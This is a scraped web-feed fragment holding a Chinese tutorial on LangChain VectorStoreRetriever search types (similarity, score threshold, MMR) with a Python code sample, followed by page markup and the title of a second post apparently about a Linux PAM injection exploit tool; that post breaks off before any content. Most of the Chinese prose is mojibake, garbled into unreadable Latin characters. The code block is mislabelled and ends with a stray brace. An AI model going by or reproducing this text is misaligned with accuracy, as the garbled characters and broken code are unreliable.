<p>å¾ˆå¤šå¼€å‘è€…åœ¨å®é™…å¼€å‘ä¸­ä¼šå›°æƒ‘ï¼šè¿™ä¸‰ç§æœç´¢ç±»å‹åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿä¸åŒåœºæ™¯è¯¥é€‰å“ªç§ï¼Ÿæœ¬æ–‡å°†ä»åŸç†ã€å‚æ•°ã€é€‚ç”¨åœºæ™¯ã€å®é™…æ•ˆæœå››ä¸ªç»´åº¦ï¼Œå¸®ä½ å½»åº•ç†æ¸…å®ƒä»¬çš„å·®å¼‚ï¼Œç»™å‡ºæ˜ç¡®çš„é€‰å‹å»ºè®®ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€å…ˆæ˜ç¡®åŸºç¡€ä¿¡æ¯ï¼šä¸‰ç§æœç´¢ç±»å‹æ¦‚è§ˆ</h3>
<p>å…ˆé€šè¿‡ä¸€å¼ è¡¨æ ¼å¿«é€ŸæŒæ¡ä¸‰ç§æœç´¢ç±»å‹çš„æ ¸å¿ƒå®šä¹‰å’Œé»˜è®¤å‚æ•°ï¼š</p>

























<table><thead><tr><th>æœç´¢ç±»å‹</th><th>è¯´æ˜</th><th>é»˜è®¤å‚æ•°</th></tr></thead><tbody><tr><td>similarity</td><td>ç›¸ä¼¼åº¦æœç´¢ï¼ˆé»˜è®¤ï¼‰</td><td>{"k": 4} - è¿”å›å‰kä¸ªæœ€ç›¸ä¼¼çš„æ–‡æ¡£</td></tr><tr><td>similarity_score_threshold</td><td>å¸¦åˆ†æ•°é˜ˆå€¼çš„ç›¸ä¼¼åº¦æœç´¢</td><td>{"k": 4, "score_threshold": 0.8} - è¿”å›ç›¸ä¼¼åº¦å¤§äºé˜ˆå€¼çš„æ–‡æ¡£</td></tr><tr><td>mmr</td><td>æœ€å¤§è¾¹é™…ç›¸å…³æ€§æœç´¢</td><td>{"k": 4, "fetch_k": 20, "lambda_mult": 0.5} - å¹³è¡¡ç›¸å…³æ€§å’Œå¤šæ ·æ€§</td></tr></tbody></table>
<h3 data-id="heading-2">äºŒã€æ·±åº¦æ‹†è§£ï¼šä¸‰ç§æœç´¢ç±»å‹çš„æ ¸å¿ƒå·®å¼‚</h3>
<h4 data-id="heading-3">1. similarityï¼šçº¯ç›¸å…³æ€§ä¼˜å…ˆçš„åŸºç¡€æœç´¢</h4>
<h5 data-id="heading-4">æ ¸å¿ƒåŸç†</h5>
<p>æœ€åŸºç¡€çš„å‘é‡æœç´¢é€»è¾‘ï¼šè®¡ç®—æŸ¥è¯¢å‘é‡ä¸çŸ¥è¯†åº“ä¸­æ‰€æœ‰æ–‡æ¡£å‘é‡çš„ç›¸ä¼¼åº¦ï¼ˆå¸¸ç”¨ä½™å¼¦ç›¸ä¼¼åº¦ï¼‰ï¼ŒæŒ‰ç›¸ä¼¼åº¦ä»é«˜åˆ°ä½æ’åºï¼Œç›´æ¥å–å‰ <code>k</code> ä¸ªç»“æœã€‚</p>
<p>æ ¸å¿ƒç‰¹ç‚¹ï¼šåªå…³æ³¨â€œç›¸å…³æ€§â€ï¼Œä¸è€ƒè™‘ç»“æœæ˜¯å¦é‡å¤ï¼Œä¹Ÿä¸è®¾ç½®ä»»ä½•ç­›é€‰é—¨æ§›ã€‚</p>
<h5 data-id="heading-5">å‚æ•°è§£è¯»</h5>
<p>ä»…éœ€å…³æ³¨ <code>k</code>ï¼šä»£è¡¨æœ€ç»ˆè¿”å›çš„æ–‡æ¡£æ•°é‡ï¼Œé»˜è®¤å€¼ä¸º4ã€‚æ— è®ºæ–‡æ¡£ç›¸ä¼¼åº¦å¤šä½ï¼Œåªè¦æ’ååœ¨å‰kä½ï¼Œå°±ä¼šè¢«è¿”å›ï¼ˆè‹¥çŸ¥è¯†åº“ä¸­æ–‡æ¡£ä¸è¶³kä¸ªï¼Œåˆ™è¿”å›å…¨éƒ¨ï¼‰ã€‚</p>
<h5 data-id="heading-6">é€‚ç”¨åœºæ™¯</h5>
<ul>
<li>ç®€å•é—®ç­”åœºæ™¯ï¼šæ¯”å¦‚å°å‹çŸ¥è¯†åº“çš„ç²¾å‡†åŒ¹é…ï¼Œå¸Œæœ›å¿«é€Ÿè·å–æœ€ç›¸å…³çš„ç»“æœï¼›</li>
<li>çŸ¥è¯†åº“ç‰¹æ€§ï¼šæ–‡æ¡£æ•°é‡å°‘ã€å†…å®¹åŒè´¨åŒ–ä½ï¼Œå‡ ä¹æ²¡æœ‰é‡å¤å†…å®¹ï¼›</li>
<li>éœ€æ±‚æ˜ç¡®ï¼šå¯¹ç»“æœæ•°é‡æœ‰ç¡¬æ€§è¦æ±‚ï¼Œä¸éœ€è¦è¿‡æ»¤ä½ç›¸å…³æ€§å†…å®¹ã€‚</li>
</ul>
<h5 data-id="heading-7">å®é™…æ•ˆæœç¤ºä¾‹</h5>
<p>æŸ¥è¯¢ï¼šã€Œå¦‚ä½•å­¦ä¹ Pythonã€</p>
<p>è¿”å›ç»“æœï¼šç›¸ä¼¼åº¦æ’åå‰4çš„æ–‡æ¡£ï¼Œå¯èƒ½æ˜¯ã€ŒPythonåŸºç¡€è¯­æ³•å…¥é—¨ã€ã€ŒPythonåŸºç¡€è¯­æ³•è¯¦è§£ã€ã€ŒPythonå…¥é—¨å®æˆ˜æ¡ˆä¾‹ã€ã€ŒPythonå­¦ä¹ è·¯å¾„è§„åˆ’ã€â€”â€” å…¶ä¸­å‰ä¸¤ç¯‡å†…å®¹é«˜åº¦é‡å¤ï¼Œä½†å› ç›¸å…³æ€§æœ€é«˜ä»ä¼šè¢«åŒæ—¶è¿”å›ã€‚</p>
<h4 data-id="heading-8">2. similarity_score_thresholdï¼šå¸¦é—¨æ§›çš„ç²¾å‡†æœç´¢</h4>
<h5 data-id="heading-9">æ ¸å¿ƒåŸç†</h5>
<p>åœ¨çº¯ç›¸ä¼¼åº¦æœç´¢çš„åŸºç¡€ä¸Šï¼Œå¢åŠ äº†â€œç›¸ä¼¼åº¦é˜ˆå€¼â€ç­›é€‰ã€‚æµç¨‹æ˜¯ï¼šå…ˆè®¡ç®—æ‰€æœ‰æ–‡æ¡£çš„ç›¸ä¼¼åº¦ â†’ è¿‡æ»¤æ‰ç›¸ä¼¼åº¦ä½äº <code>score_threshold</code> çš„æ–‡æ¡£ â†’ ä»å‰©ä½™ç¬¦åˆæ¡ä»¶çš„æ–‡æ¡£ä¸­å–å‰ <code>k</code> ä¸ªï¼ˆè‹¥ç¬¦åˆæ¡ä»¶çš„æ–‡æ¡£ä¸è¶³kä¸ªï¼Œåˆ™è¿”å›å…¨éƒ¨ç¬¦åˆæ¡ä»¶çš„ï¼‰ã€‚</p>
<p>æ ¸å¿ƒç‰¹ç‚¹ï¼šå…¼é¡¾ç›¸å…³æ€§å’Œç²¾å‡†åº¦ï¼Œé€šè¿‡é˜ˆå€¼è¿‡æ»¤ä½è´¨é‡ã€ä½ç›¸å…³æ€§çš„â€œå™ªéŸ³æ–‡æ¡£â€ã€‚</p>
<h5 data-id="heading-10">å‚æ•°è§£è¯»</h5>
<ul>
<li><code>k</code>ï¼šæœ€ç»ˆè¿”å›çš„æœ€å¤§æ–‡æ¡£æ•°é‡ï¼Œé»˜è®¤4ï¼›</li>
<li><code>score_threshold</code>ï¼šç›¸ä¼¼åº¦é˜ˆå€¼ï¼ˆèŒƒå›´0-1ï¼‰ï¼Œå€¼è¶Šé«˜è¦æ±‚è¶Šä¸¥æ ¼ï¼Œé»˜è®¤0.8ã€‚</li>
</ul>
<h5 data-id="heading-11">é€‚ç”¨åœºæ™¯</h5>
<ul>
<li>é«˜ç²¾å‡†åº¦è¦æ±‚åœºæ™¯ï¼šæ¯”å¦‚ä¸“ä¸šé¢†åŸŸé—®ç­”ï¼ˆåŒ»ç–—ã€æ³•å¾‹ã€é‡‘èï¼‰ï¼Œä¸å…è®¸è¿”å›æ— å…³æˆ–æ“¦è¾¹å†…å®¹ï¼›</li>
<li>å¤æ‚çŸ¥è¯†åº“ï¼šçŸ¥è¯†åº“ä¸­å­˜åœ¨å¤§é‡æ— å…³æ–‡æ¡£ï¼Œéœ€è¦è¿‡æ»¤å™ªéŸ³ï¼›</li>
<li>ä¸¥æ ¼è´¨é‡æ§åˆ¶ï¼šæ¯”å¦‚å®¢æœæœºå™¨äººï¼Œå¿…é¡»ä¿è¯å›ç­”çš„ä¾æ®æ˜¯é«˜åº¦ç›¸å…³çš„æ–‡æ¡£ã€‚</li>
</ul>
<h5 data-id="heading-12">å®é™…æ•ˆæœç¤ºä¾‹</h5>
<p>æŸ¥è¯¢ï¼šã€Œå¦‚ä½•å­¦ä¹ Pythonã€ï¼Œè®¾ç½® <code>score_threshold=0.8</code></p>
<p>è¿”å›ç»“æœï¼šä»…ä¿ç•™ç›¸ä¼¼åº¦â‰¥0.8çš„æ–‡æ¡£ã€‚è‹¥ç¬¦åˆæ¡ä»¶çš„æ–‡æ¡£åªæœ‰2ç¯‡ï¼ˆã€ŒPythonåŸºç¡€è¯­æ³•å…¥é—¨ã€ã€ŒPythonå­¦ä¹ è·¯å¾„è§„åˆ’ã€ï¼‰ï¼Œåˆ™æœ€ç»ˆè¿”å›2ç¯‡ï¼Œè€Œéå¼ºåˆ¶è¿”å›4ç¯‡ã€‚</p>
<h4 data-id="heading-13">3. mmrï¼šå¹³è¡¡ç›¸å…³ä¸å¤šæ ·çš„å…¨é¢æœç´¢</h4>
<h5 data-id="heading-14">æ ¸å¿ƒåŸç†</h5>
<p>MMRï¼ˆMaximum Marginal Relevanceï¼Œæœ€å¤§è¾¹é™…ç›¸å…³æ€§ï¼‰æ˜¯ä¸€ç§è¿›é˜¶æœç´¢ç®—æ³•ï¼Œæ ¸å¿ƒç›®æ ‡æ˜¯â€œå…¼é¡¾ç›¸å…³æ€§å’Œå¤šæ ·æ€§â€ï¼Œé¿å…è¿”å›å†…å®¹é‡å¤çš„ç»“æœã€‚å…·ä½“æµç¨‹ï¼š</p>
<ol>
<li>å…ˆä»çŸ¥è¯†åº“ä¸­ç­›é€‰å‡º <code>fetch_k</code> ä¸ªæœ€ç›¸ä¼¼çš„æ–‡æ¡£ï¼ˆä½œä¸ºå€™é€‰é›†ï¼Œé»˜è®¤20ï¼‰ï¼›</li>
<li>ä»å€™é€‰é›†ä¸­è¿­ä»£é€‰æ‹©æ–‡æ¡£ï¼šä¼˜å…ˆé€‰ä¸æŸ¥è¯¢ç›¸å…³çš„ï¼Œä½†åŒæ—¶å°½é‡é¿å…é€‰ä¸å·²é€‰æ–‡æ¡£é«˜åº¦ç›¸ä¼¼çš„ï¼›</li>
<li>é€šè¿‡ <code>lambda_mult</code> è°ƒèŠ‚æƒé‡ï¼šå€¼è¶Šæ¥è¿‘1ï¼Œè¶Šåå‘ç›¸å…³æ€§ï¼›è¶Šæ¥è¿‘0ï¼Œè¶Šåå‘å¤šæ ·æ€§ï¼ˆé»˜è®¤0.5ï¼Œå‡è¡¡çŠ¶æ€ï¼‰ã€‚</li>
</ol>
<h5 data-id="heading-15">å‚æ•°è§£è¯»</h5>
<ul>
<li>
<p><code>k</code>ï¼šæœ€ç»ˆè¿”å›çš„æ–‡æ¡£æ•°é‡ï¼Œé»˜è®¤4ï¼›</p>
</li>
<li>
<p><code>fetch_k</code>ï¼šå€™é€‰é›†å¤§å°ï¼ˆéœ€â‰¥kï¼‰ï¼Œå€™é€‰é›†è¶Šå¤§ï¼Œå¯é€‰çš„å¤šæ ·æ€§æ–‡æ¡£è¶Šå¤šï¼›</p>
</li>
<li>
<p><code>lambda_mult</code>ï¼šå¹³è¡¡ç³»æ•°ï¼ˆ0-1ï¼‰ï¼Œé»˜è®¤0.5ï¼š</p>
<ul>
<li>lambda_mult=1ï¼šç­‰ä»·äºçº¯similarityæœç´¢ï¼ˆåªçœ‹ç›¸å…³æ€§ï¼‰ï¼›</li>
<li>lambda_mult=0ï¼šå®Œå…¨è¿½æ±‚å¤šæ ·æ€§ï¼ˆå¯èƒ½å¿½ç•¥ç›¸å…³æ€§ï¼Œä¸æ¨èï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h5 data-id="heading-16">é€‚ç”¨åœºæ™¯</h5>
<ul>
<li>å¼€æ”¾å¼é—®ç­”åœºæ™¯ï¼šéœ€è¦è¦†ç›–å¤šè§’åº¦ç­”æ¡ˆï¼Œæ¯”å¦‚ã€ŒPythonå­¦ä¹ æ–¹æ³•æœ‰å“ªäº›ã€ï¼Œå¸Œæœ›åŒæ—¶è·å–åŸºç¡€è¯­æ³•ã€é¡¹ç›®å®æˆ˜ã€ä¹¦ç±æ¨èã€åœ¨çº¿è¯¾ç¨‹ç­‰ä¸åŒç»´åº¦çš„å†…å®¹ï¼›</li>
<li>é«˜é‡å¤åº¦çŸ¥è¯†åº“ï¼šçŸ¥è¯†åº“ä¸­å­˜åœ¨å¤§é‡ç›¸ä¼¼æ–‡æ¡£ï¼ˆå¦‚åŒä¸€é—®é¢˜çš„ä¸åŒç‰ˆæœ¬å›ç­”ï¼‰ï¼Œéœ€è¦é¿å…é‡å¤å¬å›ï¼›</li>
<li>å…¨é¢ä¿¡æ¯éœ€æ±‚ï¼šæ¯”å¦‚ç”¨æˆ·éœ€è¦äº†è§£æŸä¸ªä¸»é¢˜çš„å…¨è²Œï¼Œè€Œéå•ä¸€ç²¾å‡†ç­”æ¡ˆã€‚</li>
</ul>
<h5 data-id="heading-17">å®é™…æ•ˆæœç¤ºä¾‹</h5>
<p>æŸ¥è¯¢ï¼šã€Œå¦‚ä½•å­¦ä¹ Pythonã€ï¼Œè®¾ç½® <code>lambda_mult=0.5</code></p>
<p>è¿”å›ç»“æœï¼šä¸ä¼šå‡ºç°å¤šç¯‡é‡å¤çš„åŸºç¡€è¯­æ³•æ–‡æ¡£ï¼Œè€Œæ˜¯å‡è¡¡è¿”å›ã€ŒPythonåŸºç¡€è¯­æ³•å…¥é—¨ã€ã€ŒPythoné¡¹ç›®å®æˆ˜æŒ‡å—ã€ã€ŒPythonç»å…¸å­¦ä¹ ä¹¦ç±æ¨èã€ã€ŒPythonåœ¨çº¿è¯¾ç¨‹æ±‡æ€»ã€â€”â€” å…¼é¡¾ç›¸å…³æ€§å’Œå¤šæ ·æ€§ã€‚</p>
<h3 data-id="heading-18">ä¸‰ã€å…³é”®å·®å¼‚å¯¹æ¯”è¡¨ï¼ˆä¸€ç›®äº†ç„¶ï¼‰</h3>









































<table><thead><tr><th>å¯¹æ¯”ç»´åº¦</th><th>similarity</th><th>similarity_score_threshold</th><th>mmr</th></tr></thead><tbody><tr><td>æ ¸å¿ƒç›®æ ‡</td><td>ä»…è¿½æ±‚æœ€é«˜ç›¸å…³æ€§</td><td>é«˜ç›¸å…³æ€§ + è¿‡æ»¤ä½è´¨é‡ç»“æœ</td><td>ç›¸å…³æ€§ä¸å¤šæ ·æ€§å¹³è¡¡</td></tr><tr><td>æ ¸å¿ƒå‚æ•°</td><td>kï¼ˆè¿”å›æ•°é‡ï¼‰</td><td>kã€score_thresholdï¼ˆé˜ˆå€¼ï¼‰</td><td>kã€fetch_kï¼ˆå€™é€‰é›†ï¼‰ã€lambda_multï¼ˆå¹³è¡¡ç³»æ•°ï¼‰</td></tr><tr><td>ç»“æœç‰¹ç‚¹</td><td>ç›¸å…³æ€§æœ€é«˜ï¼Œä½†å¯èƒ½é‡å¤</td><td>ç²¾å‡†åº¦é«˜ï¼Œæ— ä½ç›¸å…³ç»“æœ</td><td>å…¼é¡¾ç›¸å…³ä¸å¤šæ ·ï¼Œé¿å…é‡å¤</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>ç®€å•ç²¾å‡†åŒ¹é…ã€å°å‹çŸ¥è¯†åº“</td><td>ä¸“ä¸šé¢†åŸŸã€é«˜ç²¾å‡†åº¦éœ€æ±‚</td><td>å¼€æ”¾å¼é—®ç­”ã€å…¨é¢ä¿¡æ¯éœ€æ±‚</td></tr><tr><td>ç»“æœæ•°é‡</td><td>å›ºå®šè¿”å›kä¸ªï¼ˆä¸è¶³åˆ™è¡¥å…¨ï¼‰</td><td>æœ€å¤šè¿”å›kä¸ªï¼ˆå¯èƒ½æ›´å°‘ï¼‰</td><td>å›ºå®šè¿”å›kä¸ª</td></tr></tbody></table>
<h3 data-id="heading-19">å››ã€é€‰å‹å»ºè®®ï¼šæŒ‰åœºæ™¯å¿«é€Ÿå†³ç­–</h3>
<p>æŒæ¡äº†å·®å¼‚åï¼Œå®é™…å¼€å‘ä¸­æ— éœ€çº ç»“ï¼ŒæŒ‰ä»¥ä¸‹åŸåˆ™å¿«é€Ÿé€‰å‹ï¼š</p>
<ol>
<li>è‹¥éœ€æ±‚ç®€å•ã€è¿½æ±‚å¿«é€Ÿç²¾å‡†åŒ¹é…ï¼Œä¸”çŸ¥è¯†åº“å†…å®¹å¹²å‡€ï¼ˆæ— å¤ªå¤šå™ªéŸ³ï¼‰ï¼šé€‰é»˜è®¤çš„ <code>similarity</code>ï¼›</li>
<li>è‹¥å¯¹ç»“æœç²¾å‡†åº¦è¦æ±‚æé«˜ï¼Œä¸å…è®¸å‡ºç°æ— å…³å†…å®¹ï¼ˆå¦‚ä¸“ä¸šé¢†åŸŸã€å®¢æœæœºå™¨äººï¼‰ï¼šé€‰ <code>similarity_score_threshold</code>ï¼Œå»ºè®®å°† <code>score_threshold</code> è®¾ä¸º0.7-0.9ï¼ˆæ ¹æ®çŸ¥è¯†åº“å®é™…æƒ…å†µè°ƒæ•´ï¼‰ï¼›</li>
<li>è‹¥éœ€è¦è¦†ç›–å¤šè§’åº¦ç­”æ¡ˆã€é¿å…é‡å¤å†…å®¹ï¼ˆå¦‚å¼€æ”¾å¼é—®ç­”ã€ä¸»é¢˜å…¨è²ŒæŸ¥è¯¢ï¼‰ï¼šé€‰ <code>mmr</code>ï¼Œé»˜è®¤ <code>lambda_mult=0.5</code> å³å¯æ»¡è¶³å¤§éƒ¨åˆ†åœºæ™¯ï¼Œè‹¥éœ€æ›´ä¾§é‡ç›¸å…³æ€§å¯è°ƒè‡³0.7-0.8ã€‚</li>
</ol>
<h3 data-id="heading-20">äº”ã€æ€»ç»“</h3>
<p>VectorStoreRetriever çš„ä¸‰ç§æœç´¢ç±»å‹ï¼Œæœ¬è´¨æ˜¯ä¸ºäº†é€‚é…ä¸åŒçš„â€œå¬å›éœ€æ±‚â€ï¼š</p>
<ul>
<li><code>similarity</code> æ˜¯åŸºç¡€æ¬¾ï¼Œä¸»æ‰“â€œå¿«å‡†â€ï¼›</li>
<li><code>similarity_score_threshold</code> æ˜¯ç²¾å‡†æ¬¾ï¼Œä¸»æ‰“â€œæ— å™ªéŸ³â€ï¼›</li>
<li><code>mmr</code> æ˜¯è¿›é˜¶æ¬¾ï¼Œä¸»æ‰“â€œå…¨é¢æ€§â€ã€‚</li>
</ul>
<p>å®é™…å¼€å‘ä¸­ï¼Œå»ºè®®æ ¹æ®çŸ¥è¯†åº“çš„è§„æ¨¡ã€å†…å®¹ç‰¹æ€§ä»¥åŠç”¨æˆ·çš„æŸ¥è¯¢éœ€æ±‚ï¼Œçµæ´»é€‰æ‹©åˆé€‚çš„æœç´¢ç±»å‹ã€‚å¦‚æœä¸ç¡®å®šï¼Œä¹Ÿå¯ä»¥åšå°èŒƒå›´æµ‹è¯•ï¼šç”¨åŒä¸€æ‰¹æŸ¥è¯¢å¯¹æ¯”ä¸‰ç§ç±»å‹çš„å¬å›ç»“æœï¼Œå†æ ¹æ®å®é™…æ•ˆæœå¾®è°ƒå‚æ•°ï½</p>
<p>ğŸ“Œ æœ¬æ–‡é…å¥—ä»£ç ç¤ºä¾‹ï¼ˆå¿«é€Ÿä¸Šæ‰‹ä¸‰ç§æœç´¢ç±»å‹ï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">from langchain.vectorstores import Chroma
from langchain.embeddings import OpenAIEmbeddings

<span class="hljs-comment"># åˆå§‹åŒ–å‘é‡å­˜å‚¨ï¼ˆç¤ºä¾‹ï¼‰</span>
<span class="hljs-attr">embeddings</span> = OpenAIEmbeddings()
<span class="hljs-attr">vector_store</span> = Chroma(embedding_function=embeddings)

<span class="hljs-comment"># 1. similarity æœç´¢</span>
<span class="hljs-attr">retriever_similarity</span> = vector_store.as_retriever(
    <span class="hljs-attr">search_type</span>=<span class="hljs-string">"similarity"</span>,
    <span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">4</span>}
)

<span class="hljs-comment"># 2. similarity_score_threshold æœç´¢</span>
<span class="hljs-attr">retriever_threshold</span> = vector_store.as_retriever(
    <span class="hljs-attr">search_type</span>=<span class="hljs-string">"similarity_score_threshold"</span>,
    <span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">4</span>, <span class="hljs-string">"score_threshold"</span>: <span class="hljs-number">0.8</span>}
)

<span class="hljs-comment"># 3. mmr æœç´¢</span>
<span class="hljs-attr">retriever_mmr</span> = vector_store.as_retriever(
    <span class="hljs-attr">search_type</span>=<span class="hljs-string">"mmr"</span>,
    <span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">4</span>, <span class="hljs-string">"fetch_k"</span>: <span class="hljs-number">20</span>, <span class="hljs-string">"lambda_mult"</span>: <span class="hljs-number">0.5</span>}
)

<span class="hljs-comment"># æ‰§è¡ŒæŸ¥è¯¢</span>
<span class="hljs-attr">query</span> = <span class="hljs-string">"å¦‚ä½•å­¦ä¹ Python"</span>
print(retriever_similarity.get_relevant_documents(query))
print(retriever_threshold.get_relevant_documents(query))
print(retriever_mmr.get_relevant_documents(query))
}
</code></pre>
<p>å¦‚æœè§‰å¾—æœ¬æ–‡å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ç‚¹èµã€æ”¶è—ï½ æœ‰ä»»ä½•ç–‘é—®æˆ–è¡¥å……ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux PAMç¯å¢ƒå˜é‡æ³¨å…¥æ¼æ´åˆ©ç”¨å·¥å…·è§£æ]]></title>    <link>https://juejin.cn/post/7595056696518197267</link>    <guid>https://juejin.cn/post/7595056696518197267</guid>    <pubDate>2026-01-15T07:29:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595056696518197267" data-draft-id="7595167566143815699" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux PAMç¯å¢ƒå˜é‡æ³¨å…¥æ¼æ´åˆ©ç”¨å·¥å…·è§£æ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-15T07:29:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux PAMç¯å¢ƒå˜é‡æ³¨å…¥æ¼æ´åˆ©ç”¨å·¥å…·è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T07:29:23.000Z" title="Thu Jan 15 2026 07:29:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é¡¹ç›®æ ‡é¢˜ä¸æè¿°</h2>
